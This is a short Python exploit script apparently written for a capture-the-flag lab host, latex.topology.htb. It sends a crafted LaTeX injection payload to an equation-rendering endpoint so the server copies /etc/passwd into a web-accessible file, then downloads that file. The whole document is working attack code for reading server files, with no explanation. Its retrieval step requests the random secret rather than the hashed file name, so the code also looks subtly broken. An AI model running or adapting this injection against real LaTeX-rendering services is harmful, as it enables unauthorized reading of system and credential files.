from hashlib import md5
from secrets import token_hex
from urllib.parse import quote
from urllib.request import Request, urlopen
from urllib.error import URLError

target_url = "http://latex.topology.htb/equation.php?eqn="
target_file = "/etc/passwd"
secret = token_hex(8)

latex = "!\n"\
"\\newwrite\\copyfile\n"\
"\\immediate\\openout\\copyfile=" + md5(secret.encode('UTF-8')).hexdigest() + ".png\n"\
"\\newread\\file\n"\
"\\openin\\file=" + target_file + "\n"\
"\\begingroup\\endlinechar=-1\n"\
"\\loop\\unless\\ifeof\\file\n"\
"\\read\\file to\\fileline\n"\
"\\immediate\\write\\copyfile{\\unexpanded\\expandafter{\\fileline}}\n"\
"\\repeat\n"\
"\\endgroup"

payload = quote(latex, safe='')

req = Request(target_url + payload)

try:
    response = urlopen(req)
except URLError as e:
    if hasattr(e, 'reason'):
        print("staging failed")
        print("Reason: ", e.reason)
    elif hasattr(e, 'code'):
        print("Staging failed")
        print("Error code:", e.code)
else:
    req = Request(target_url + secret)
    with urlopen(req) as response:
        f = open("response.txt", "wb")
        f.write(response.read())
        f.close
        #print(response.read().decode('UTF-8'))
